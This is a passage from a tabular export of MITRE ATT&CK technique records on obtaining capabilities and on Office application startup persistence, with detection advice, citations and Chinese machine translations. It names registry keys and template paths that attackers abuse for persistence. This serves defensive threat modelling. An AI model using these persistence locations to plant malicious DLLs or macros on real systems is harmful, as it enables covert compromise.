Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related follow-on behavior, such as [Code Signing](https://attack.mitre.org/techniques/T1553/002) or [Install Root Certificate](https://attack.mitre.org/techniques/T1553/004).",PRE,Malware Repository: Malware Metadata,True,T1588,,,,,,,,,"(Citation: IBM MegaCortex),(Citation: DFIR Ryuk 2 Hour Speed Run November 2020),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: Symantec Palmerworm Sep 2020),(Citation: ESET Lazarus Jun 2020),",获取能力：代码签名证书,攻击者可能会购买和/或窃取可在定位期间使用的代码签名证书。代码签名是对可执行文件和脚本进行数字签名以确认软件作者并保证代码未被更改或损坏的过程。代码签名为开发人员的程序提供了一定程度的真实性，并保证程序没有被篡改。（引用：维基百科代码签名）用户和/或安全工具可能比未签名的代码更信任签名的代码即使他们不知道谁颁发了证书或作者是谁。在 [代码签名](https://attack.mitre.org/techniques/T1553/002) 之前，攻击者可能会购买或窃取代码签名证书以用于操作。代码签名证书的购买可以使用前台组织或使用从先前被破坏的实体窃取的信息来完成，该实体允许攻击者向证书提供者验证该实体的身份。攻击者也可能直接从受感染的第三方窃取代码签名材料。
T1588.004,Obtain Capabilities: Digital Certificates,"Adversaries may buy and/or steal SSL/TLS certificates that can be used during targeting. SSL/TLS certificates are designed to instill trust. They include information about the key, information about its owner's identity, and the digital signature of an entity that has verified the certificate's contents are correct. If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate with its owner.

Adversaries may purchase or steal SSL/TLS certificates to further their operations, such as encrypting C2 traffic (ex: [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002) with [Web Protocols](https://attack.mitre.org/techniques/T1071/001)) or even enabling [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) if the certificate is trusted or otherwise added to the root of trust (i.e. [Install Root Certificate](https://attack.mitre.org/techniques/T1553/004)). The purchase of digital certificates may be done using a front organization or using information stolen from a previously compromised entity that allows the adversary to validate to a certificate provider as that entity. Adversaries may also steal certificate materials directly from a compromised third-party, including from certificate authorities.(Citation: DiginotarCompromise) Adversaries may register or hijack domains that they will later purchase an SSL/TLS certificate for.

Certificate authorities exist that allow adversaries to acquire SSL/TLS certificates, such as domain validation certificates, for free.(Citation: Let's Encrypt FAQ)

After obtaining a digital certificate, an adversary may then install that certificate (see [Install Digital Certificate](https://attack.mitre.org/techniques/T1608/003)) on infrastructure under their control.",https://attack.mitre.org/techniques/T1588/004,01 October 2020,16 October 2021,1.2,Resource Development,"Consider use of services that may aid in the tracking of newly issued certificates and/or certificates in use on sites across the Internet. In some cases it may be possible to pivot on known pieces of certificate information to uncover other adversary infrastructure.(Citation: Splunk Kovar Certificates 2017) Some server-side components of adversary tools may have default values set for SSL/TLS certificates.(Citation: Recorded Future Beacon Certificates)

Detection efforts may be focused on related behaviors, such as [Web Protocols](https://attack.mitre.org/techniques/T1071/001), [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002), and/or [Install Root Certificate](https://attack.mitre.org/techniques/T1553/004).",PRE,"Certificate: Certificate Registration, Internet Scan: Response Content",True,T1588,,,,,,,,,"(Citation: Phish Labs Silent Librarian),(Citation: McAfee Honeybee),(Citation: Secureworks COBALT DICKENS September 2019),(Citation: ESET PLEAD Malware July 2018),(Citation: CISA AppleJeus Feb 2021),",获取能力：数字证书,攻击者可能会购买和/或窃取可在定位期间使用的 SSL/TLS 证书。 SSL/TLS 证书旨在灌输信任。它们包括有关密钥的信息、有关其所有者身份的信息以及已验证证书内容正确的实体的数字签名。如果签名是有效的，并且检查证书的人信任签名者，那么他们知道他们可以使用该密钥与其所有者进行通信。攻击者可能会购买或窃取 SSL/TLS 证书以推进其操作，例如使用 [Web 协议](https ://attack.mitre.org/techniques/T1071/001)) 或什至启用 [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) 如果证书受信任或以其他方式添加到信任根（即[安装根证书](https://attack.mitre.org/techniques/T1553/004)）。数字证书的购买可以使用前台组织或使用从先前被破坏的实体窃取的信息来完成，该实体允许攻击者向证书提供者验证该实体的身份。攻击者还可能直接从受感染的第三方（包括证书颁发机构）窃取证书材料。（引文：DiginotarCompromise）攻击者可能注册或劫持他们稍后将为其购买 SSL/TLS 证书的域。存在允许攻击者免费获取 SSL/TLS 证书的证书颁发机构，例如域验证证书。（引用：让我们加密常见问题解答）在获得数字证书后，攻击者可以安装该证书（请参阅 [安装数字证书]（ https://attack.mitre.org/techniques/T1608/003)) 关于他们控制的基础设施。
T1588.005,Obtain Capabilities: Exploits,"Adversaries may buy, steal, or download exploits that can be used during targeting. An exploit takes advantage of a bug or vulnerability in order to cause unintended or unanticipated behavior to occur on computer hardware or software. Rather than developing their own exploits, an adversary may find/modify exploits from online or purchase them from exploit vendors.(Citation: Exploit Database)(Citation: TempertonDarkHotel)(Citation: NationsBuying)

In addition to downloading free exploits from the internet, adversaries may purchase exploits from third-party entities. Third-party entities can include technology companies that specialize in exploit development, criminal marketplaces (including exploit kits), or from individuals.(Citation: PegasusCitizenLab)(Citation: Wired SandCat Oct 2019) In addition to purchasing exploits, adversaries may steal and repurpose exploits from third-party entities (including other adversaries).(Citation: TempertonDarkHotel)

An adversary may monitor exploit provider forums to understand the state of existing, as well as newly discovered, exploits. There is usually a delay between when an exploit is discovered and when it is made public. An adversary may target the systems of those known to conduct exploit research and development in order to gain that knowledge for use during a subsequent operation.

Adversaries may use exploits during various phases of the adversary lifecycle (i.e. [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190), [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203), [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068), [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211), [Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212), [Exploitation of Remote Services](https://attack.mitre.org/techniques/T1210), and [Application or System Exploitation](https://attack.mitre.org/techniques/T1499/004)).",https://attack.mitre.org/techniques/T1588/005,01 October 2020,15 April 2021,1.0,Resource Development,"
Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on behaviors relating to the use of exploits (i.e. [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190), [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203), [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068), [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211), [Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212), [Exploitation of Remote Services](https://attack.mitre.org/techniques/T1210), and [Application or System Exploitation](https://attack.mitre.org/techniques/T1499/004)).",PRE,,True,T1588,,,,,,,,,"(Citation: KISA Operation Muzabi),",获取能力：利用,攻击者可能会购买、窃取或下载可在定位期间使用的漏洞。漏洞利用利用错误或漏洞来导致计算机硬件或软件上发生意外或意外行为。攻击者可以从在线查找/修改漏洞利用程序或从漏洞利用程序供应商处购买它们，而不是开发自己的漏洞利用程序。（引文：漏洞利用数据库）（引文：TempertonDarkHotel）（引文：NationsBuying）除了从互联网上下载免费漏洞利用程序外，攻击者可能会从第三方实体购买漏洞利用程序。第三方实体可以包括专门从事漏洞利用开发、犯罪市场（包括漏洞利用工具包）或来自个人的技术公司。（引文：PegasusCitizenLab）（引文：Wired SandCat Oct 2019）除了购买漏洞利用之外，攻击者还可能窃取和重新利用来自第三方实体（包括其他攻击者）的攻击。（引用：TempertonDarkHotel）攻击者可能会监视攻击提供者论坛以了解现有以及新发现的攻击的状态。从发现漏洞到公开漏洞之间通常存在延迟。对手可能会瞄准那些已知进行漏洞利用研究和开发的系统，以便获得该知识以在后续行动中使用。攻击者可能会在攻击者生命周期的各个阶段使用漏洞利用（即[利用面向公众的应用程序](https://attack.mitre.org/techniques/T1190)、[利用客户端执行](https://attack.mitre .org/techniques/T1203)，[用于提升权限的利用](https://attack.mitre.org/techniques/T1068)，[用于防御规避的利用](https://attack.mitre.org/techniques/T1211 )、[凭证访问的利用](https://attack.mitre.org/techniques/T1212)、[远程服务的利用](https://attack.mitre.org/techniques/T1210)和[应用程序或系统利用](https://attack.mitre.org/techniques/T1499/004))。
T1588.001,Obtain Capabilities: Malware,"Adversaries may buy, steal, or download malware that can be used during targeting. Malicious software can include payloads, droppers, post-compromise tools, backdoors, packers, and C2 protocols. Adversaries may acquire malware to support their operations, obtaining a means for maintaining control of remote machines, evading defenses, and executing post-compromise behaviors.

In addition to downloading free malware from the internet, adversaries may purchase these capabilities from third-party entities. Third-party entities can include technology companies that specialize in malware development, criminal marketplaces (including Malware-as-a-Service, or MaaS), or from individuals. In addition to purchasing malware, adversaries may steal and repurpose malware from third-party entities (including other adversaries).",https://attack.mitre.org/techniques/T1588/001,01 October 2020,17 October 2021,1.1,Resource Development,"Consider analyzing malware for features that may be associated with malware providers, such as compiler used, debugging artifacts, code similarities, or even group identifiers associated with specific MaaS offerings. Malware repositories can also be used to identify additional samples associated with the developers and the adversary utilizing their services. Identifying overlaps in malware use by different adversaries may indicate malware was obtained by the adversary rather than developed by them. In some cases, identifying overlapping characteristics in malware used by different adversaries may point to a shared quartermaster.(Citation: FireEyeSupplyChain)

Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on post-compromise phases of the adversary lifecycle.",PRE,"Malware Repository: Malware Content, Malware Repository: Malware Metadata",True,T1588,,,,,,,,,"(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: McAfee Night Dragon),(Citation: FSI Andariel Campaign Rifle July 2017),(Citation: ESET Operation Spalax Jan 2021),(Citation: Mandiant APT1),(Citation: NCC Group TA505),(Citation: NSA NCSC Turla OilRig),(Citation: TrendMicro EarthLusca 2022),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: ESET BackdoorDiplomacy Jun 2021),(Citation: CrowdStrike AQUATIC PANDA December 2021),(Citation: Recorded Future Turla Infra 2020),(Citation: DFIR Conti Bazar Nov 2021),(Citation: MSTIC DEV-0537 Mar 2022),",获取能力：恶意软件,攻击者可能会购买、窃取或下载可在定位期间使用的恶意软件。恶意软件可能包括有效载荷、dropper、后入侵工具、后门、打包程序和 C2 协议。攻击者可能会获取恶意软件来支持他们的操作，获得维持对远程机器的控制、逃避防御和执行攻击后行为的手段。除了从 Internet 下载免费恶意软件外，攻击者还可以从第三方实体购买这些功能。第三方实体可以包括专门从事恶意软件开发、犯罪市场（包括恶意软件即服务或 MaaS）或来自个人的技术公司。除了购买恶意软件外，攻击者还可能从第三方实体（包括其他攻击者）窃取和重新利用恶意软件。
T1588.002,Obtain Capabilities: Tool,"Adversaries may buy, steal, or download software tools that can be used during targeting. Tools can be open or closed source, free or commercial. A tool can be used for malicious purposes by an adversary, but (unlike malware) were not intended to be used for those purposes (ex: [PsExec](https://attack.mitre.org/software/S0029)). Tool acquisition can involve the procurement of commercial software licenses, including for red teaming tools such as [Cobalt Strike](https://attack.mitre.org/software/S0154). Commercial software may be obtained through purchase, stealing licenses (or licensed copies of the software), or cracking trial versions.(Citation: Recorded Future Beacon 2019)

Adversaries may obtain tools to support their operations, including to support execution of post-compromise behaviors. In addition to freely downloading or purchasing software, adversaries may steal software and/or software licenses from third-party entities (including other adversaries).",https://attack.mitre.org/techniques/T1588/002,01 October 2020,17 October 2021,1.1,Resource Development,"In some cases, malware repositories can also be used to identify features of tool use associated with an adversary, such as watermarks in [Cobalt Strike](https://attack.mitre.org/software/S0154) payloads.(Citation: Analyzing CS Dec 2020)

Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on post-compromise phases of the adversary lifecycle.",PRE,Malware Repository: Malware Metadata,True,T1588,,Mnemonic AS; SOCCRATES,,,,,,,"(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: Securelist DarkVishnya Dec 2018),(Citation: Unit 42 Gorgon Group Aug 2018),(Citation: Mandiant FIN5 GrrCON Oct 2016),(Citation: FireEye APT32 May 2017),(Citation: SentinelOne Aoqin Dragon June 2022),(Citation: Securelist APT Trends Q2 2017),(Citation: Kaspersky Lyceum October 2021),(Citation: FoxIT Wocao December 2019),(Citation: Symantec Tick Apr 2016),(Citation: MSTIC DEV-0537 Mar 2022),(Citation: Symantec Whitefly March 2019),(Citation: CrowdStrike AQUATIC PANDA December 2021),(Citation: FireEye KEGTAP SINGLEMALT October 2020),(Citation: ESET Lazarus Jun 2020),(Citation: Unit42 Emissary Panda May 2019),(Citation: Symantec Waterbug Jun 2019),(Citation: Secureworks COBALT DICKENS September 2019),(Citation: ESET Operation Spalax Jan 2021),(Citation: ESET Lazarus KillDisk April 2018),(Citation: Secureworks IRON LIBERTY July 2019),(Citation: Volexity Patchwork June 2018),(Citation: FireEye APT33 Guardrail),(Citation: Unit 42 DarkHydrus July 2018),(Citation: BlackBerry CostaRicto November 2020),(Citation: NCC Group TA505),(Citation: Checkpoint MosesStaff Nov 2021),(Citation: ESET BackdoorDiplomacy Jun 2021),(Citation: NCSC Joint Report Public Tools),(Citation: Kaspersky Carbanak),(Citation: DFIR Conti Bazar Nov 2021),(Citation: SecureWorks August 2019),(Citation: Symantec Thrip June 2018),(Citation: FireEye FIN10 June 2017),(Citation: Kaspersky ThreatNeedle Feb 2021),(Citation: McAfee Night Dragon),(Citation: PTSecurity Cobalt Dec 2016),(Citation: Kaspersky Cloud Atlas August 2019),(Citation: Cybereason Oceanlotus May 2017),(Citation: FireEye APT19),(Citation: QiAnXin APT-C-36 Feb2019),(Citation: Symantec Palmerworm Sep 2020),(Citation: Check Point APT35 CharmPower January 2022),(Citation: Zscaler Lyceum DnsSystem June 2022),(Citation: Group IB Silence Aug 2019),(Citation: Forcepoint BITTER Pakistan Oct 2016),(Citation: NCC Group APT15 Alive and Strong),(Citation: ClearSky and Trend Micro Operation Wilted Tulip July 2017),(Citation: Mandiant No Easy Breach),(Citation: Checkpoint IndigoZebra July 2021),(Citation: FireEye FIN6 Apr 2019),(Citation: Cycraft Chimera April 2020),(Citation: Symantec Elfin Mar 2019),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: Cybereason OperationCuckooBees May 2022),(Citation: Mandiant UNC3890 Aug 2022),(Citation: BitDefender Chafer May 2020),(Citation: Kaspersky Ferocious Kitten Jun 2021),(Citation: FireEye APT35 2018),(Citation: Security Intelligence More Eggs Aug 2019),(Citation: Talos Kimsuky Nov 2021),(Citation: FireEye APT29 Nov 2018),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: Symantec Leafminer July 2018),(Citation: F-Secure The Dukes),(Citation: Cylance Cleaver),(Citation: Microsoft GALLIUM December 2019),(Citation: SecureList Silence Nov 2017),(Citation: Mandiant APT1),(Citation: Lab52 WIRTE Apr 2019),(Citation: Talos Frankenstein June 2019),(Citation: RedCanary Mockingbird May 2020),(Citation: Check Point Rocket Kitten),(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: Microsoft POLONIUM June 2022),(Citation: TrendMicro EarthLusca 2022),(Citation: FireEye APT41 Aug 2019),(Citation: Bizeul 2014),(Citation: FireEye APT28 Hospitality Aug 2017),(Citation: Dell TG-3390),(Citation: Anomali Static Kitten February 2021),(Citation: ClearSky Lazarus Aug 2020),(Citation: FireEye TRITON 2019),(Citation: Palo Alto Sofacy 06-2018),(Citation: NCC Group Chimera January 2021),(Citation: Proofpoint TA407 September 2019),(Citation: Netscout Stolen Pencil Dec 2018),(Citation: IBM ITG07 June 2019),(Citation: Securelist Sofacy Feb 2018),",获取能力：工具,攻击者可能会购买、窃取或下载可在定位期间使用的软件工具。工具可以是开源的或闭源的、免费的或商业的。攻击者可以将工具用于恶意目的，但（与恶意软件不同）并非旨在用于这些目的（例如：[PsExec](https://attack.mitre.org/software/S0029)）。工具获取可能涉及商业软件许可证的采购，包括用于红队工具，例如 [Cobalt Strike](https://attack.mitre.org/software/S0154)。商业软件可以通过购买、窃取许可证（或软件的许可副本）或破解试用版获得。（引用：Recorded Future Beacon 2019）攻击者可以获得支持其操作的工具，包括支持执行妥协后行为.除了免费下载或购买软件外，攻击者还可能从第三方实体（包括其他攻击者）窃取软件和/或软件许可。
T1588.006,Obtain Capabilities: Vulnerabilities,"Adversaries may acquire information about vulnerabilities that can be used during targeting. A vulnerability is a weakness in computer hardware or software that can, potentially, be exploited by an adversary to cause unintended or unanticipated behavior to occur. Adversaries may find vulnerability information by searching open databases or gaining access to closed vulnerability databases.(Citation: National Vulnerability Database)

An adversary may monitor vulnerability disclosures/databases to understand the state of existing, as well as newly discovered, vulnerabilities. There is usually a delay between when a vulnerability is discovered and when it is made public. An adversary may target the systems of those known to conduct vulnerability research (including commercial vendors). Knowledge of a vulnerability may cause an adversary to search for an existing exploit (i.e. [Exploits](https://attack.mitre.org/techniques/T1588/005)) or to attempt to develop one themselves (i.e. [Exploits](https://attack.mitre.org/techniques/T1587/004)).",https://attack.mitre.org/techniques/T1588/006,15 October 2020,15 April 2021,1.0,Resource Development,"Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on behaviors relating to the potential use of exploits for vulnerabilities (i.e. [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190), [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203), [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068), [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211), [Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212), [Exploitation of Remote Services](https://attack.mitre.org/techniques/T1210), and [Application or System Exploitation](https://attack.mitre.org/techniques/T1499/004)).",PRE,,True,T1588,,,,,,,,,"(Citation: US District Court Indictment GRU Unit 74455 October 2020),",获取能力：漏洞,攻击者可能会获取有关可在定位期间使用的漏洞的信息。漏洞是计算机硬件或软件中的弱点，可能会被对手利用以导致意外或意外行为发生。攻击者可以通过搜索开放数据库或访问关闭的漏洞数据库来找到漏洞信息。（引用：国家漏洞数据库）攻击者可以监控漏洞披露/数据库以了解现有以及新发现的漏洞的状态。从发现漏洞到公开漏洞之间通常存在延迟。攻击者可能会瞄准那些已知进行漏洞研究的系统（包括商业供应商）。对漏洞的了解可能会导致攻击者搜索现有的漏洞利用（即[Exploits](https://attack.mitre.org/techniques/T1588/005)）或尝试自己开发一个漏洞（即[Exploits]( https://attack.mitre.org/techniques/T1587/004))。
T1137,Office Application Startup,"Adversaries may leverage Microsoft Office-based applications for persistence between startups. Microsoft Office is a fairly common application suite on Windows-based operating systems within an enterprise network. There are multiple mechanisms that can be used with Office for persistence when an Office-based application is started; this can include the use of Office Template Macros and add-ins.

A variety of features have been discovered in Outlook that can be abused to obtain persistence, such as Outlook rules, forms, and Home Page.(Citation: SensePost Ruler GitHub) These persistence mechanisms can work within Outlook or be used through Office 365.(Citation: TechNet O365 Outlook Rules)",https://attack.mitre.org/techniques/T1137,14 December 2017,15 October 2021,1.3,Persistence,"Collect process execution information including process IDs (PID) and parent process IDs (PPID) and look for abnormal chains of activity resulting from Office processes. Non-standard process execution trees may also indicate suspicious or malicious behavior. If winword.exe is the parent process for suspicious processes and activity relating to other adversarial techniques, then it could indicate that the application was used maliciously.

Many Office-related persistence mechanisms require changes to the Registry and for binaries, files, or scripts to be written to disk or existing files modified to include malicious scripts. Collect events related to Registry key creation and modification for keys that could be used for Office-based persistence.(Citation: CrowdStrike Outlook Forms)(Citation: Outlook Today Home Page)

Microsoft has released a PowerShell script to safely gather mail forwarding rules and custom forms in your mail environment as well as steps to interpret the output.(Citation: Microsoft Detect Outlook Forms) SensePost, whose tool [Ruler](https://attack.mitre.org/software/S0358) can be used to carry out malicious rules, forms, and Home Page attacks, has released a tool to detect Ruler usage.(Citation: SensePost NotRuler)","Office 365, Windows","Application Log: Application Log Content, Command: Command Execution, File: File Creation, File: File Modification, Module: Module Load, Process: Process Creation, Windows Registry: Windows Registry Key Creation, Windows Registry: Windows Registry Key Modification",False,,,"Loic Jaquemet; Microsoft Threat Intelligence Center (MSTIC); Nick Carr, Mandiant; Praetorian; Ricardo Dias; Sahar Shukrun","Administrator, User",,,,,,"(Citation: ESET Gamaredon June 2020),(Citation: Cybereason Oceanlotus May 2017),(Citation: Cybereason Cobalt Kitty 2017),(Citation: MRWLabs Office Persistence Add-ins),(Citation: Palo Alto Office Test Sofacy),(Citation: win10_asr),(Citation: SensePost Outlook Home Page),(Citation: SensePost Outlook Forms)",Office 应用程序启动,对手可能会利用基于 Microsoft Office 的应用程序在初创公司之间保持持久性。 Microsoft Office 是企业网络中基于 Windows 的操作系统上相当常见的应用程序套件。启动基于 Office 的应用程序时，有多种机制可用于 Office 的持久性；这可以包括使用 Office 模板宏和加载项。在 Outlook 中发现了多种可被滥用以获得持久性的功能，例如 Outlook 规则、表单和主页。（引用：SensePost Ruler GitHub）这些持久性机制可以在 Outlook 中工作，也可以通过 Office 365 使用。（引用：TechNet O365 Outlook 规则）
T1137.006,Office Application Startup: Add-ins,"Adversaries may abuse Microsoft Office add-ins to obtain persistence on a compromised system. Office add-ins can be used to add functionality to Office programs. (Citation: Microsoft Office Add-ins) There are different types of add-ins that can be used by the various Office products; including Word/Excel add-in Libraries (WLL/XLL), VBA add-ins, Office Component Object Model (COM) add-ins, automation add-ins, VBA Editor (VBE), Visual Studio Tools for Office (VSTO) add-ins, and Outlook add-ins. (Citation: MRWLabs Office Persistence Add-ins)(Citation: FireEye Mail CDS 2018)

Add-ins can be used to obtain persistence because they can be set to execute code when an Office application starts. ",https://attack.mitre.org/techniques/T1137/006,07 November 2019,16 August 2021,1.1,Persistence,"Monitor and validate the Office trusted locations on the file system and audit the Registry entries relevant for enabling add-ins.(Citation: GlobalDotName Jun 2019)(Citation: MRWLabs Office Persistence Add-ins)

Collect process execution information including process IDs (PID) and parent process IDs (PPID) and look for abnormal chains of activity resulting from Office processes. Non-standard process execution trees may also indicate suspicious or malicious behavior","Office 365, Windows","Command: Command Execution, File: File Creation, File: File Modification, Process: Process Creation, Windows Registry: Windows Registry Key Creation, Windows Registry: Windows Registry Key Modification",True,T1137,,,"Administrator, User",,,,,,"(Citation: CheckPoint Naikon May 2020),(Citation: Talos Bisonal Mar 2020),(Citation: win10_asr)",Office 应用程序启动：加载项,攻击者可能会滥用 Microsoft Office 插件以在受感染的系统上获得持久性。 Office 加载项可用于向 Office 程序添加功能。 （引用：Microsoft Office 插件）各种 Office 产品可以使用不同类型的插件；包括 Word/Excel 插件库 (WLL/XLL)、VBA 插件、Office 组件对象模型 (COM) 插件、自动化插件、VBA 编辑器 (VBE)、Visual Studio Tools for Office (VSTO) 添加-ins 和 Outlook 加载项。 （引用：MRWLabs Office Persistence Add-ins）（引用：FireEye Mail CDS 2018）加载项可用于获得持久性，因为它们可以设置为在 Office 应用程序启动时执行代码。
T1137.001,Office Application Startup: Office Template Macros,"Adversaries may abuse Microsoft Office templates to obtain persistence on a compromised system. Microsoft Office contains templates that are part of common Office applications and are used to customize styles. The base templates within the application are used each time an application starts. (Citation: Microsoft Change Normal Template)

Office Visual Basic for Applications (VBA) macros (Citation: MSDN VBA in Office) can be inserted into the base template and used to execute code when the respective Office application starts in order to obtain persistence. Examples for both Word and Excel have been discovered and published. By default, Word has a Normal.dotm template created that can be modified to include a malicious macro. Excel does not have a template file created by default, but one can be added that will automatically be loaded.(Citation: enigma0x3 normal.dotm)(Citation: Hexacorn Office Template Macros) Shared templates may also be stored and pulled from remote locations.(Citation: GlobalDotName Jun 2019) 

Word Normal.dotm location:<br>
<code>C:\Users\&lt;username&gt;\AppData\Roaming\Microsoft\Templates\Normal.dotm</code>

Excel Personal.xlsb location:<br>
<code>C:\Users\&lt;username&gt;\AppData\Roaming\Microsoft\Excel\XLSTART\PERSONAL.XLSB</code>

Adversaries may also change the location of the base template to point to their own by hijacking the application's search order, e.g. Word 2016 will first look for Normal.dotm under <code>C:\Program Files (x86)\Microsoft Office\root\Office16\</code>, or by modifying the GlobalDotName registry key. By modifying the GlobalDotName registry key an adversary can specify an arbitrary location, file name, and file extension to use for the template that will be loaded on application startup. To abuse GlobalDotName, adversaries may first need to register the template as a trusted document or place it in a trusted location.(Citation: GlobalDotName Jun 2019) 

An adversary may need to enable macros to execute unrestricted depending on the system or enterprise security policy on use of macros.",https://attack.mitre.org/techniques/T1137/001,07 November 2019,16 August 2021,1.1,Persistence,"Many Office-related persistence mechanisms require changes to the Registry and for binaries, files, or scripts to be written to disk or existing files modified to include malicious scripts. Collect events related to Registry key creation and modification for keys that could be used for Office-based persistence.(Citation: CrowdStrike Outlook Forms)(Citation: Outlook Today Home Page) Modification to base templates, like Normal.dotm, should also be investigated since the base templates should likely not contain VBA macros. Changes to the Office macro security settings should also be investigated.(Citation: GlobalDotName Jun 2019)","Office 365, Windows","Command: Command Execution, File: File Creation, File: File Modification, Process: Process Creation, Windows Registry: Windows Registry Key Creation, Windows Registry: Windows Registry Key Modification",True,T1137,,,"Administrator, User",,,,,,"(Citation: Unit 42 BackConfig May 2020),(Citation: Reaqta MuddyWater November 2017),(Citation: Talos Cobalt Strike September 2020),(Citation: MRWLabs Office Persistence Add-ins),(Citation: win10_asr)",Office 应用程序启动：Office 模板宏,攻击者可能会滥用 Microsoft Office 模板来获取受感染系统的持久性。 Microsoft Office 包含的模板是常见 Office 应用程序的一部分，用于自定义样式。每次启动应用程序时都会使用应用程序中的基本模板。 （引用：Microsoft Change Normal Template）Office Visual Basic for Applications (VBA) 宏（引用：Office 中的 MSDN VBA）可以插入到基本模板中，并用于在相应的 Office 应用程序启动时执行代码以获得持久性。已发现并发布了 Word 和 Excel 的示例。默认情况下，Word 创建了一个 Normal.dotm 模板，可以对其进行修改以包含恶意宏。 Excel 没有默认创建的模板文件，但可以添加一个会自动加载的文件。（引用：enigma0x3 normal.dotm）（引用：Hexacorn Office 模板宏）也可以从远程位置存储和提取共享模板。 （引用：GlobalDotName Jun 2019）Word Normal.dotm 位置：<br> <code>C:\Users\<用户名>\AppData\Roaming\Microsoft\Templates\Normal.dotm</code> Excel Personal.xlsb 位置： <br> <code>C:\Users\&lt;username&gt;\AppData\Roaming\Microsoft\Excel\XLSTART\PERSONAL.XLSB</code> 攻击者还可以通过劫持将基本模板的位置更改为指向自己的应用程序的搜索顺序，例如 Word 2016 将首先在 <code>C:\Program Files (x86)\Microsoft Office\root\Office16\</code> 下查找 Normal.dotm，或者通过修改 GlobalDotName 注册表项。通过修改 GlobalDotName 注册表项，攻击者可以指定任意位置、文件名和文件扩展名，以用于将在应用程序启动时加载的模板。要滥用 GlobalDotName，攻击者可能首先需要将模板注册为受信任的文档或将其放置在受信任的位置。（引用：GlobalDotName Jun 2019）攻击者可能需要根据系统或企业安全策略启用宏不受限制地执行宏的使用。
T1137.002,Office Application Startup: Office Test,"Adversaries may abuse the Microsoft Office ""Office Test"" Registry key to obtain persistence on a compromised system. An Office Test Registry location exists that allows a user to specify an arbitrary DLL that will be executed every time an Office application is started. This Registry key is thought to be used by Microsoft to load DLLs for testing and debugging purposes while developing Office applications. This Registry key is not created by default during an Office installation.(Citation: Hexacorn Office Test)(Citation: Palo Alto Office Test Sofacy)

There exist user and global Registry keys for the Office Test feature:

* <code>HKEY_CURRENT_USER\Software\Microsoft\Office test\Special\Perf</code>
* <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Office test\Special\Perf</code>

Adversaries may add this Registry key and specify a malicious DLL that will be executed whenever an Office application, such as Word or Excel, is started.",https://attack.mitre.org/techniques/T1137/002,07 November 2019,16 August 2021,1.1,Persistence,"Monitor for the creation of the Office Test Registry key. Many Office-related persistence mechanisms require changes to the Registry and for binaries, files, or scripts to be written to disk or existing files modified to include malicious scripts. Collect events related to Registry key creation and modification for keys that could be used for Office-based persistence. Since v13.52, Autoruns can detect tasks set up using the Office Test Registry key.(Citation: Palo Alto Office Test Sofacy)

Consider monitoring Office processes for anomalous DLL loads.","Office 365, Windows","Command: Command Execution, File: File Creation, File: File Modification, Module: Module Load, Process: Process Creation, Windows Registry: Windows Registry Key Creation, Windows Registry: Windows Registry Key Modification",True,T1137,,,"Administrator, User",,"Office 2007, 2010, 2013, and 2016",,,,"(Citation: Palo Alto Office Test Sofacy),(Citation: Palo Alto Office Test Sofacy),(Citation: win10_asr)",Office 应用程序启动：Office 测试,攻击者可能会滥用 Microsoft Office“Office Test”注册表项来获得受感染系统的持久性。存在一个 Office 测试注册表位置，允许用户指定将在每次启动 Office 应用程序时执行的任意 DLL。 Microsoft 认为此注册表项用于在开发 Office 应用程序时加载 DLL 以进行测试和调试。在 Office 安装过程中，默认情况下不会创建此注册表项。（引用：Hexacorn Office 测试）（引用：Palo Alto Office Test Sofacy）Office 测试功能存在用户和全局注册表项：* <code>HKEY_CURRENT_USER\Software\ Microsoft\Office test\Special\Perf</code> * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Office test\Special\Perf</code> 攻击者可能会添加此注册表项并指定一个恶意 DLL，只要 Office Word 或 Excel 等应用程序已启动。
T1137.003,Office Application Startup: Outlook Forms,"Adversaries may abuse Microsoft Outlook forms to obtain persistence on a compromised system. Outlook forms are used as templates for presentation and functionality in Outlook messages. Custom Outlook forms can be created that will execute code when a specifically crafted email is sent by an adversary utilizing the same custom Outlook form.(Citation: SensePost Outlook Forms)

Once malicious forms have been added to the user’s mailbox, they will be loaded when Outlook is started. Malicious forms will execute when an adversary sends a specifically crafted email to the user.(Citation: SensePost Outlook Forms)",https://attack.mitre.org/techniques/T1137/003,07 November 2019,16 August 2021,1.1,Persistence,"Microsoft has released a PowerShell script to safely gather mail forwarding rules and custom forms in your mail environment as well as steps to interpret the output.(Citation: Microsoft Detect Outlook Forms) SensePost, whose tool [Ruler](https://attack.mitre.org/software/S0358) can be used to carry out malicious rules, forms, and Home Page attacks, has released a tool to detect Ruler usage.(Citation: SensePost NotRuler)

